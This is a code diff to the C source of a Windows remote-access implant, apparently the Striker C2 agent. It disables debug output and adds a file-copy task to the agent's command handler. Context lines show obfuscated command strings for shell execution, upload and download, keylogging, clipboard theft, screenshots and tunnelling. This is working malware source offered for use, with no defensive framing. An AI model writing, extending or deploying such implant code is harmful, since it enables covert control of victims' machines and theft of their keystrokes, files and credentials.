@@ -14,7 +14,7 @@
 // #define INSECURE_SSL
 
 // Uncomment the below macro to enable debug output
-#define STRIKER_DEBUG
+// #define STRIKER_DEBUG
 
 // Size of agent UID
 #define AGENT_UID_SIZE 17
@@ -1477,6 +1477,30 @@ size_t delete_file(char *filename){
   return count;
 }
 
+size_t copy_file(char *dst, char *src){
+
+  FILE *rfo = fopen(src, "rb");
+  if (!rfo)
+    return 0;
+  FILE *wfo = fopen(dst, "wb");
+  if (!wfo){
+    fclose(rfo);
+    return 0;
+  }
+  size_t written = 0, n = 0, block_size = 999999;
+  char *buff = malloc(block_size);
+  while (1){
+    n = fread(buff, 1, block_size, rfo);
+    if (!n)
+      break;
+    written += fwrite(buff, 1, n, wfo);
+  }
+  fclose(rfo);
+  fclose(wfo);
+  free(buff);
+  return written;
+}
+
 task *parse_task(cJSON *json){
 
   char strs[][20] = {"[OBFS_ENC]uid", "[OBFS_ENC]taskType", "[OBFS_ENC]data"};
@@ -1518,8 +1542,8 @@ DWORD WINAPI task_executor(LPVOID ptr)
   #endif
   cJSON *data = tsk->data;
   buffer *result_buff = create_buffer(0);
-  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd", "[OBFS_ENC]kill", "[OBFS_ENC]tunnel", "[OBFS_ENC]bridge", "[OBFS_ENC]webload", "[OBFS_ENC]clipread", "[OBFS_ENC]clipwrite", "[OBFS_ENC]screenshot", "[OBFS_ENC]kbdfile", "[OBFS_ENC]ipinfo", "[OBFS_ENC]cat", "[OBFS_ENC]ls", "[OBFS_ENC]del"};
-  for (int i = 0; i < 19; i++)
+  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd", "[OBFS_ENC]kill", "[OBFS_ENC]tunnel", "[OBFS_ENC]bridge", "[OBFS_ENC]webload", "[OBFS_ENC]clipread", "[OBFS_ENC]clipwrite", "[OBFS_ENC]screenshot", "[OBFS_ENC]kbdfile", "[OBFS_ENC]ipinfo", "[OBFS_ENC]cat", "[OBFS_ENC]ls", "[OBFS_ENC]del", "[OBFS_ENC]cp"};
+  for (int i = 0; i < 20; i++)
     obfs_decode(cmd_strs[i]);
   if (!strcmp(tsk->type, cmd_strs[0])){ // Run a shell command.
     char strs[][20] = {"[OBFS_ENC]cmd", "[OBFS_ENC]%s 2>&1"};
@@ -1762,6 +1786,13 @@ DWORD WINAPI task_executor(LPVOID ptr)
     resize_buffer(result_buff, 20);
     result_buff->used = snprintf(result_buff->buffer, 19, "%ld", count) + 1;
     tsk->successful = 1;
+  }else if (!strcmp(tsk->type, cmd_strs[19])){ // Copy a file locally
+    size_t bytes_copied = copy_file(cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "dst")), cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "src")));
+    char *len_res = malloc(32);
+    snprintf(len_res, 32, "%ld", (unsigned long)bytes_copied);
+    buffer_strcpy(result_buff, len_res);
+    free(len_res);
+    tsk->successful = bytes_copied != 0;
   }else{
     char msg[] = "[OBFS_ENC]Not implemented!";
     buffer_strcpy(result_buff, obfs_decode(msg));
